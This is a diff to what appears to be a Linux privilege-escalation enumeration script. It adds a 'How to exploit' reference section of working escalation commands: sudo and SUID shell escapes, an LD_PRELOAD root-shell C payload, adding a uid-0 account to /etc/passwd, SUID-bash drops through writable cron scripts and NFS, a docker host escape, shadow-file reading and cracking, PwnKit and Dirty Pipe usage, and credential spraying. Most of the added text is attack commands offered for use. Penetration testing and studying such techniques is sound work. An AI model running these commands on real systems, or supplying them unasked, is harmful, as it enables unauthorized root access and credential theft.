@@ -298,6 +298,56 @@ find /etc /opt /home -type f -mtime -7 2>/dev/null | sed 's/^/    /' | head -30
 info "world-writable dirs missing sticky bit (safe-to-abuse temp):"
 find / -path /proc -prune -o -type d -perm -0002 ! -perm -1000 -print 2>/dev/null | sed 's/^/    /' | head -20
 
+# ============================================================ how to exploit
+# Reference for the [!] findings above: if the script flagged a vector, here is
+# the concrete escalation path. Read-only guidance - nothing is run for you.
+sec "How to exploit (reference for the [!] findings above)"
+xploit() { _emit "  ${C_F}$1${C_R}"; shift; for l in "$@"; do _emit "      $l"; done; }
+xploit "Sudo: NOPASSWD / (ALL) ALL" \
+  "sudo -l  -> for each allowed binary check gtfobins.github.io/#<bin>" \
+  "e.g.  sudo find . -exec /bin/sh \\; -quit   |   sudo vim -c ':!/bin/sh'   |   sudo su"
+xploit "Sudo: LD_PRELOAD kept in env" \
+  "write x.c:  void _init(){setgid(0);setuid(0);system(\"/bin/bash -p\");}" \
+  "gcc -fPIC -shared -nostartfiles -o /tmp/x.so x.c ; sudo LD_PRELOAD=/tmp/x.so <allowed-cmd>"
+xploit "Sudo: CVE-2021-3156 (Baron Samedit)" \
+  "sudoedit -s '\\' \$(python3 -c 'print(\"A\"*1000)')  crashes -> use a compiled PoC for your libc"
+xploit "SUID binary (GTFOBins)" \
+  "many keep euid with -p:  bash -p  |  /path/suidbin per gtfobins '#SUID' section" \
+  "e.g.  find . -exec /bin/sh -p \\; -quit   |   cp: copy a payload over a root file   |   nmap --interactive"
+xploit "File capabilities" \
+  "cap_setuid+ep:  ./binary -c 'import os;os.setuid(0);os.system(\"/bin/sh\")' (python)" \
+  "cap_dac_read_search:  read /etc/shadow with the capable binary (e.g. tar/xxd)"
+xploit "Writable cron / timer script" \
+  "append a payload and wait for root to run it:" \
+  "echo 'cp /bin/bash /tmp/rb; chmod 4755 /tmp/rb' >> <writable-script>   then  /tmp/rb -p"
+xploit "Writable dir in PATH / writable root-run binary" \
+  "drop a binary with the same name a root process/cron calls (or replace the writable one) -> reverse shell"
+xploit "Writable systemd unit" \
+  "set ExecStart= to your payload, then  systemctl daemon-reload && systemctl restart <svc>  (or wait for boot)"
+xploit "/etc/passwd writable" \
+  "echo 'r00t:'\$(openssl passwd -1 -salt x pass)':0:0::/root:/bin/bash' >> /etc/passwd ; su r00t"
+xploit "/etc/shadow readable" \
+  "unshadow /etc/passwd /etc/shadow > h ; john h   (or hashcat -m 1800)"
+xploit "docker group / writable docker.sock" \
+  "docker run -v /:/mnt --rm -it alpine chroot /mnt sh    (you are root on the host fs)"
+xploit "lxd/lxc group" \
+  "import an alpine image, init with security.privileged=true, mount / from host, chroot"
+xploit "disk group" \
+  "debugfs /dev/sda1 -R 'cat /etc/shadow'   (read any file on the raw device)"
+xploit "NFS no_root_squash" \
+  "from a box where you are root:  mount -t nfs <ip>:/export /mnt ; cp /bin/bash /mnt/rb; chmod 4755 /mnt/rb  -> /export/rb -p on target"
+xploit "PwnKit (CVE-2021-4034, pkexec)" \
+  "run a PwnKit PoC (single C file, compile offline) -> instant root if polkit unpatched (pre Jan-2022)"
+xploit "Dirty Pipe (CVE-2022-0847)" \
+  "compile the PoC; overwrite a SUID binary or /etc/passwd read-only page -> root (kernel 5.8-5.16.11)"
+xploit "Old kernel" \
+  "linux-exploit-suggester.sh -> pick a matching numbered exploit, compile offline, run"
+xploit "Writable shared-library dir" \
+  "place a malicious .so a root binary dlopens (match the SONAME) -> code exec as root"
+xploit "Found credentials / SSH keys / tokens" \
+  "reuse them:  su <user>  |  ssh -i <key> user@host  |  spray across the subnet; check password reuse"
+_emit "  Match each item to the ${C_F}[!]${C_R} lines above. Always operate within your rules of engagement."
+
 _emit ""
 _emit "${C_H}Done.${C_R} Review every ${C_F}[!]${C_R} line. Nothing was changed on this host."
 [ -n "$OUT" ] && _emit "Full report written to: $OUT"
